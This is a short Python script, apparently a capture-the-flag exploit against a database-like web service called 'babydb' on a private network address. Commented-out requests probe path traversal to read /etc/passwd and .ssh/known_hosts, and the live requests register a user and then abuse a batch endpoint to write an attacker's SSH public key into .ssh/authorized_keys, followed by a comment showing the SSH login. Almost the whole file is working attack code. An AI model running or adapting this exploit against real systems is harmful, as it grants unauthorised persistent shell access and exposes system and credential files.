import requests

#r = requests.post('http://localhost:8000/load?\b\b\b\b\b\b../wtf')
#r = requests.post('http://localhost:8000/register?../../../.ssh/known_hosts')
#r = requests.post('http://localhost:8000/register?user', data="user")
#r = requests.post('http://localhost:8000/load?wtf')
#r = requests.post('http://localhost:8000/store?zzz',data="wtfwtf")
#r = requests.post('http://192.168.201.11:8000/batch?a', data="login?user?user:login??:load?../../../../../etc/passwd?qqq")

r = requests.post('http://192.168.201.11:8000/register?user', data="user")
print r.status_code
print r.text

r = requests.post('http://192.168.201.11:8000/batch?a', data="login?user?user:login??:store?../../.ssh/authorized_keys?ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDYozuBzf1ym5Gd0Mp5TTvre9V4CirnFNSUjC1jSIip8Haag8RFMwbYfi74DuRqOGMohvZ+xjq1Tiraxcof5ZwXXZBaDrFkLFF+sHgx4+4tnXmlRjMYzQDKSMhn36u1MhMHlLKR+oOe8bVWwFMQoT66bGpZ/kN40vSsp8xD2rFbOsY+qYdyGEN3rl7JY1JhTdzIbRZp1dI57AmFMmm/JptB8RQdlBt5tujKLnKohpN2LPD9csb8hLP15Y2IQ1hYbmdI3qkOTYCrYoXFHpeo4t4MInTrqa/orFsHkGai0kYzhn1ZjXlOhe+9VwJjhDZXObpZxNxrlLimMHgN655hRFC7g5tSrBQ4HFZHNFOwiQpFqAGHbCoCHWMYNvdm38J+kUp/4MCyhze18GoNJZSahYM4RgP+cqXor7ENtfBrfAXUTw5mKSTy2CFwwX3Gtwgxoh4sVEIbDLclVCaLL7Tl8OHNfpAz7J6/D8v6oxib5o+FQQrl1zTE18Qtz6AeBxpQ0h8A37e97jbI4ZIRCOoVK5pjO3zQXoTvFV4DbZF+67LtpaGpx2zmcWN58xosnZXOvaaV7OUeeSIaHQ2TPnbtSHneYXzuzEfDywYLNJdZeHRewxKTxDcYrLGW5MAndCzvX5OV0Ly02E/1CU2o6yO/MkGOAX56qb5lPkQBNgHpqpD9vw== blah")
print r.status_code
print r.text

# ssh -o StrictHostKeyChecking=no babydb
